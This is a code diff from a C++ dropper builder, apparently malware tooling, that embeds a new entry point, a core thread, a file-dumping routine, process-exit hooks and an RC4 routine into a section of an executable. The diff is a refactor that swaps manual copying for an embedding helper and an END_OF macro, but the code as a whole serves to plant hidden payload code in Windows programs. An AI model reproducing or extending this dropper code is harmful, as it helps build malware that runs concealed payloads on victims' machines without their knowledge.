@@ -65,7 +65,7 @@ DWORD DropperSection::build( WINSTARTFUNC OriginalEntryPoint )
 	// ExitProcess index
 	header->exitProcessIndex = _exitProcessIndex;
 	header->exitIndex = _exitIndex;
-		
+	
 	// Strings offsets
 	header->stringsOffsets.offset = ptr - _data;
 	DWORD * strOffset = (DWORD *) ptr;
@@ -144,18 +144,15 @@ DWORD DropperSection::build( WINSTARTFUNC OriginalEntryPoint )
 	
 	// find new EP and copy dropper code in it
 	DWORD newEP = ptr - _data;
-	DWORD newEPSize = (DWORD)NewEntryPoint_End - (DWORD)NewEntryPoint; 
-	memcpy(ptr, (PBYTE) NewEntryPoint, newEPSize);
-	ptr += newEPSize;
-	
-	cout << "NewEntryPoint is " << newEPSize << " bytes long, offset " << newEP << endl;
+	ptr += _embedFunction((PVOID)NewEntryPoint, (PVOID)END_OF(NewEntryPoint), header->functions.newEntryPoint, ptr);
+	cout << "NewEntryPoint is " << header->functions.newEntryPoint.size << " bytes long, offset " << header->functions.newEntryPoint.offset << endl;
 	
 	// CoreThreadProc code
-	ptr += _embedFunction((PVOID)CoreThreadProc, (PVOID)CoreThreadProc_End, header->functions.coreThread, ptr);
+	ptr += _embedFunction((PVOID)CoreThreadProc, (PVOID)END_OF(CoreThreadProc), header->functions.coreThread, ptr);
 	cout << "CoreThreadProc is " << header->functions.coreThread.size << " bytes long, offset " << header->functions.coreThread.offset << endl;
 	
 	// DumpFile code
-	ptr += _embedFunction((PVOID)DumpFile, (PVOID)DumpFile_End, header->functions.dumpFile, ptr);
+	ptr += _embedFunction((PVOID)DumpFile, (PVOID)END_OF(DumpFile), header->functions.dumpFile, ptr);
 	cout << "DumpFile is " << header->functions.dumpFile.size << " bytes long, offset " << header->functions.dumpFile.offset << endl;
 	
 	// ExitProcessHook data
@@ -167,17 +164,17 @@ DWORD DropperSection::build( WINSTARTFUNC OriginalEntryPoint )
 	// END marker
 	memcpy(ptr, "<E>\0", 4);
 	ptr += 4;	
-
+	
 	// ExitProcessHook code
-	ptr += _embedFunction((PVOID)ExitProcessHook, (PVOID)ExitProcessHook_End, header->functions.exitProcessHook, ptr);
+	ptr += _embedFunction((PVOID)ExitProcessHook, (PVOID)END_OF(ExitProcessHook), header->functions.exitProcessHook, ptr);
 	cout << "ExitProcessHook is " << header->functions.exitProcessHook.size << " bytes long, offset " << header->functions.exitProcessHook.offset << endl;
 
 	// ExitHook code
-	ptr += _embedFunction((PVOID)ExitHook, (PVOID)ExitHook_End, header->functions.exitHook, ptr);
+	ptr += _embedFunction((PVOID)ExitHook, (PVOID)END_OF(ExitHook), header->functions.exitHook, ptr);
 	cout << "ExitHook is " << header->functions.exitHook.size << " bytes long, offset " << header->functions.exitHook.offset << endl;
 	
 	// RC4 code
-	ptr += _embedFunction((PVOID)rc4_skip, (PVOID)rc4_skip_End, header->functions.rc4, ptr);
+	ptr += _embedFunction((PVOID)rc4_skip, (PVOID)END_OF(rc4_skip), header->functions.rc4, ptr);
 	cout << "RC4 is " << header->functions.rc4.size << " bytes long, offset " << (DWORD)header->functions.rc4.offset << endl;
 	
 	// compute total size
